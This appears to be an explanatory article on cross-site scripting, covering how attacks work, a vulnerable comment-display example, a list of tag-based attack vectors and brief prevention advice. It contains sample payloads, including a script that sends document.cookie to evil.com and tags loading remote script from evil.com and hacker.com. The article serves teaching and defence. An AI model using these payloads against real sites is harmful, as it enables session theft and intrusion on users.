Cross-site Scripting (XSS) is a client-side code injection attack. The attacker aims 
to execute malicious scripts in a web browser of the victim by including malicious 
code in a legitimate web page or web application. The actual attack occurs when 
the victim visits the web page or web application that executes the malicious code. 
The web page or web application becomes a vehicle to deliver the malicious script 
to the user’s browser. Vulnerable vehicles that are commonly used for Cross-site Scripting 
attacks are forums, message boards, and web pages that allow comments.

A web page or web application is vulnerable to XSS if it uses unsanitized user 
input in the output that it generates. This user input must then be parsed by the 
victim’s browser. XSS attacks are possible in VBScript, ActiveX, Flash, and even CSS. 
However, they are most common in JavaScript, primarily because JavaScript is fundamental 
to most browsing experiences.

“Isn’t Cross-site Scripting the User’s Problem?”

If an attacker can abuse an XSS vulnerability on a web page to execute arbitrary 
JavaScript in a user’s browser, the security of that vulnerable website or vulnerable 
web application and its users has been compromised. XSS is not the user’s problem like 
any other security vulnerability. If it is affecting your users, it affects you.

Cross-site Scripting may also be used to deface a website instead of targeting the user. 
The attacker can use injected scripts to change the content of the website or even redirect 
the browser to another web page, for example, one that contains malicious code.
What Can the Attacker Do with JavaScript?

XSS vulnerabilities are perceived as less dangerous than for example SQL Injection 
vulnerabilities. Consequences of the ability to execute JavaScript on a web page 
may not seem dire at first. Most web browsers run JavaScript in a very tightly 
controlled environment. JavaScript has limited access to the user’s operating 
system and the user’s files. However, JavaScript can still be dangerous if misused 
as part of malicious content:

    Malicious JavaScript has access to all the objects that the rest of the web page 
    has access to. This includes access to the user’s cookies. Cookies are often used 
    to store session tokens. If an attacker can obtain a user’s session cookie, they 
    can impersonate that user, perform actions on behalf of the user, and gain access 
    to the user’s sensitive data.
    JavaScript can read the browser DOM and make arbitrary modifications to it. 
    Luckily, this is only possible within the page where JavaScript is running.
    JavaScript can use the XMLHttpRequest object to send HTTP requests with 
    arbitrary content to arbitrary destinations.
    JavaScript in modern browsers can use HTML5 APIs. For example, it can 
    gain access to the user’s geolocation, webcam, microphone, and even 
    specific files from the user’s file system. Most of these APIs require 
    user opt-in, but the attacker can use social engineering to go around that limitation.

The above, in combination with social engineering, allow criminals to pull off 
advanced attacks including cookie theft, planting trojans, keylogging, phishing, 
and identity theft. XSS vulnerabilities provide the perfect ground to escalate 
attacks to more serious ones. Cross-site Scripting can also be used in conjunction 
with other types of attacks, for example, Cross-Site Request Forgery (CSRF).

There are several types of Cross-site Scripting attacks: stored/persistent XSS, 
reflected/non-persistent XSS, and DOM-based XSS. You can read more about them 
in an article titled Types of XSS.

How Cross-site Scripting Works

There are two stages to a typical XSS attack:

    To run malicious JavaScript code in a victim’s browser, an attacker must first find a 
    way to inject malicious code (payload) into a web page that the victim visits.
    After that, the victim must visit the web page with the malicious code. If the attack 
    is directed at particular victims, the attacker can use social engineering and/or 
    phishing to send a malicious URL to the victim.

For step one to be possible, the vulnerable website needs to directly include user input 
in its pages. An attacker can then insert a malicious string that will be used within the 
web page and treated as source code by the victim’s browser. There are also variants of 
XSS attacks where the attacker lures the user to visit a URL using social engineering and 
the payload is part of the link that the user clicks.

The following is a snippet of server-side pseudocode that is used to display the most 
recent comment on a web page:

    print "<html>"
    print "<h1>Most recent comment</h1>"
    print database.latestComment
    print "</html>"

The above script simply takes the latest comment from a database and 
includes it in an HTML page. It assumes that the comment printed out consists 
of only text and contains no HTML tags or other code. It is vulnerable to XSS, 
because an attacker could submit a comment that contains a malicious payload, for example:

    <script>doSomethingEvil();</script>

The web server provides the following HTML code to users that visit this web page:

    <html>
    <h1>Most recent comment</h1>
    <script>doSomethingEvil();</script>
    </html>

When the page loads in the victim’s browser, the attacker’s malicious 
script executes. Most often, the victim does not realize it and is unable to prevent such an attack.
Stealing Cookies Using XSS

Criminals often use XSS to steal cookies. This allows them to impersonate 
the victim. The attacker can send the cookie to their own server in many ways. 
One of them is to execute the following client-side script in the victim’s browser:

    <script>
    window.location="http://evil.com/?cookie=" + document.cookie
    </script>


    The attacker injects a payload into the website’s database by submitting a 
    vulnerable form with malicious JavaScript content.
    The victim requests the web page from the web server.
    The web server serves the victim’s browser the page with attacker’s 
    payload as part of the HTML body.
    The victim’s browser executes the malicious script contained in the HTML 
    body. In this case, it sends the victim’s cookie to the attacker’s server.
    The attacker now simply needs to extract the victim’s cookie when the HTTP request arrives at the server.
    The attacker can now use the victim’s stolen cookie for impersonation.

To learn more about how XSS attacks are conducted, you can refer to an article titled 
A comprehensive tutorial on cross-site scripting.
Cross-site Scripting Attack Vectors

The following is a list of common XSS attack vectors that an attacker could use 
to compromise the security of a website or web application through an XSS attack. 
A more extensive list of XSS payload examples is maintained by the OWASP organization: 
XSS Filter Evasion Cheat Sheet.
    <script> tag

The <script> tag is the most straightforward XSS payload. A script tag can reference external 
JavaScript code or you can embed the code within the script tag itself.

    <!-- External script -->
    <script src=http://evil.com/xss.js></script>
    <!-- Embedded script -->
    <script> alert("XSS"); </script>

JavaScript events

JavaScript event attributes such as onload and onerror can be used in many 
different tags. This is a very popular XSS attack vector.

    <!-- onload attribute in the <body> tag -->
    <body onload=alert("XSS")>

    <body> tag

An XSS payload can be delivered inside the <body> by using event attributes 
(see above) or other more obscure attributes such as the background attribute.

    <!-- background attribute -->
    <body background="javascript:alert("XSS")">

    <img> tag

Some browsers execute JavaScript found in the <img> attributes.

    <!-- <img> tag XSS -->
    <img src="javascript:alert("XSS");">
    <!--  tag XSS using lesser-known attributes -->
    <img dynsrc="javascript:alert('XSS')">
    <img lowsrc="javascript:alert('XSS')">

    <iframe> tag

    The <iframe> tag lets you embed another HTML page in the current page. 
    An IFrame may contain JavaScript but JavaScript in the IFrame does not have access 
    to the DOM of the parent page due to the Content Security Policy (CSP) of the browser. 
    However, IFrames are still very effective for pulling off phishing attacks.

    <!-- <iframe> tag XSS -->
    <iframe src="http://evil.com/xss.html">

    <input> tag

In some browsers, if the type attribute of the <input> tag is set to image, 
it can be manipulated to embed a script.

    <!-- <input> tag XSS -->
    <input type="image" src="javascript:alert('XSS');">

    <link> tag

The <link> tag, which is often used to link to external style sheets, may contain a script.

    <!-- <link> tag XSS -->
    <link rel="stylesheet" href="javascript:alert('XSS');">

    <table> tag

The background attribute of the <table> and <td> tags can be exploited to refer to a script instead of an image.

    <!-- <table> tag XSS -->
    <table background="javascript:alert('XSS')">
    <!-- <td> tag XSS -->
    <td background="javascript:alert('XSS')">

    <div> tag

The <div> tag, similar to the <table> and <td> tags, can also specify a background and therefore embed a script.

    <!-- <div> tag XSS -->
    <div style="background-image: url(javascript:alert('XSS'))">
    <!-- <div> tag XSS -->
    <div style="width: expression(alert('XSS'));">

<object> tag

The <object> tag can be used to include a script from an external site.

    <!-- <object> tag XSS -->
    <object type="text/x-scriptlet" data="http://hacker.com/xss.html">

Is Your Website or Web Application Vulnerable to Cross-site Scripting

Cross-site Scripting vulnerabilities are one of the most common web application 
vulnerabilities. The OWASP organization (Open Web Application Security Project) 
lists XSS vulnerabilities in their OWASP Top 10 2017 document as the second most prevalent issue.

Fortunately, it’s easy to test if your website or web application is vulnerable 
to XSS and other vulnerabilities by running an automated web scan using the Acunetix 
vulnerability scanner, which includes a specialized XSS scanner module. Take a demo 
and find out more about running XSS scans against your website or web application. 
An example of how you can detect blind XSS vulnerabilities with Acunetix is available 
in the following article: How to Detect Blind XSS Vulnerabilities.
How to Prevent XSS

To keep yourself safe from XSS, you must sanitize your input. Your application code 
should never output data received as input directly to the browser without checking it for malicious code.
